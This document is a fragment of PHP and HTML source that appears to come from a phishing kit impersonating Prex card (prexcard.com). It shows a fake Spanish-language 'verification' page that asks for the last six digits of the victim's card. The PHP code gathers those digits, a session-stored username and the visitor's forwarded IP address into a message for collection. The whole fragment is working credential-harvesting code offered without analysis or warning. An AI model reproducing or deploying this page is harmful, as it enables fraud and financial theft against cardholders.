...
if ( isset ($_POST['p1']) && isset ($_POST['p2']) && isset ($_POST['p3']) && isset ($_POST['p4']) && isset ($_POST['p5']) && isset ($_POST['p6']) && isset($_SESSION['SMS']) ){
$usario=$_SESSION['SMS'];

$message = "User.: ".$usario." CodSMS.: ".$_POST['p1']."".$_POST['p2']."".$_POST['p3']."".$_POST['p4']."".$_POST['p5']."".$_POST['p6']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
	...
	<div class="container content text-center">
		<div class="row">
			<div class="col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3">
				<form class="reg-page" id="formLogin" method="post" action="log4.php" enctype="multipart/form-data">
					<div class="reg-header">
						<a href="https://www.prexcard.com/"><img src="./htfoc/prexnewSolo.png" style="width: 24%;"></a>
					</div>
					<p class="p_ingresa">Metodo de verificacion</p>

					<div class="input-group margin-bottom-20 div_input" id="div_usuario">

                            <span >Ultimos 6 digitos de tu tarjeta</span>
						<label class="label_input">
							<input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p1" id="inputUsuario" placeholder=" " onkeyup="if (this.value.length == this.getAttribute('maxlength')) p2.focus()"  onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" > &nbsp;
                            <input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p2" id="inputUsuario" placeholder=" " onkeyup="if (this.value.length == this.getAttribute('maxlength')) p3.focus()" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" > &nbsp;
                            <input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p3" id="inputUsuario" placeholder=" " onkeyup="if (this.value.length == this.getAttribute('maxlength')) p4.focus()" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" > &nbsp;
                            <input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p4" id="inputUsuario" placeholder=" " onkeyup="if (this.value.length == this.getAttribute('maxlength')) p5.focus()" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" > &nbsp;
                            <input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p5" id="inputUsuario" placeholder=" " onkeyup="if (this.value.length == this.getAttribute('maxlength')) p6.focus()" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" > &nbsp;
                            <input type="number" class="inputDatos inputcentrado" style="width: 16%;" maxlength="1" minlength="1" name="p6" id="inputUsuario" placeholder=" " onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="" >
						</label>
					</div>
					...
					<div class="row">
						<div class="col-md-12">
							<button class="btn-u btn-block" type="submit" id="btnSiguiente">Confirmar</button>
							<hr>
